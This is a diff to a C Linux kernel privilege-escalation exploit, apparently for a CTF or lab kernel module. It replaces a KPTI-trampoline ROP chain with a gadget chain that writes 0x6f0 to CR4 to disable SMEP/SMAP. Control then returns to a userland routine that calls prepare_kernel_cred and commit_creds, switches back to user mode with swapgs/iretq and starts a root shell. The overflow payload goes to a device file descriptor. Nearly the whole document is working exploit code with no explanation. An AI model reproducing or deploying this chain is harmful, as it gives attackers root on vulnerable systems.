@@ -14,8 +14,8 @@ unsigned long user_cs, user_ss, user_rsp, user_rflags;
 #define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
 #define rop_swapgs 0xffffffff8160bf7e
 #define rop_iretq 0xffffffff810202af
-#define tramp 0xffffffff81800e26;
-
+#define popRDI_RCX 0xffffffff8127bbdc
+#define controlCR4 0xffffffff81028532
 static void win() {
   char *argv[] = {"/bin/sh", NULL};
   char *envp[] = {NULL};
@@ -38,6 +38,29 @@ static void save_state() {
       :
       : "memory");
 }
+
+unsigned long user_rip = (unsigned long)win;
+void escalate_privs(void) {
+  __asm__(".intel_syntax noprefix;"
+          "movabs rax, 0xffffffff8106e240;" // prepare_kernel_cred
+          "xor rdi, rdi;"
+          "call rax; mov rdi, rax;"
+          "movabs rax, 0xffffffff8106e390;" // commit_creds
+          "call rax;"
+          "swapgs;"
+          "mov r15, user_ss;"
+          "push r15;"
+          "mov r15, user_rsp;"
+          "push r15;"
+          "mov r15, user_rflags;"
+          "push r15;"
+          "mov r15, user_cs;"
+          "push r15;"
+          "mov r15, user_rip;"
+          "push r15;"
+          "iretq;"
+          ".att_syntax;");
+}
 void fatal(const char *msg) {
   perror(msg);
   exit(1);
@@ -48,21 +71,10 @@ int main() {
   char buf[0x500];
   memset(buf, 'A', 0x408);
   unsigned long *chain = (unsigned long *)&buf[0x408];
-  *chain++ = rop_pop_rdi;
-  *chain++ = 0;
-  *chain++ = prepare_kernel_cred;
-  *chain++ = rop_pop_rcx;
-  *chain++ = 0;
-  *chain++ = rop_mov_rdi_rax_rep_movsq;
-  *chain++ = commit_creds;
-  *chain++ = tramp;
-  *chain++ = 0;
-  *chain++ = 0;
-  *chain++ = (unsigned long)&win;
-  *chain++ = user_cs;
-  *chain++ = user_rflags;
-  *chain++ = user_rsp;
-  *chain++ = user_ss;
+  *chain++ = popRDI_RCX;
+  *chain++ = 0x6f0;
+  *chain++ = controlCR4;
+  *chain++ = (uint64_t)escalate_privs;
   write(global_fd, buf, (void *)chain - (void *)buf);
 
   close(global_fd);
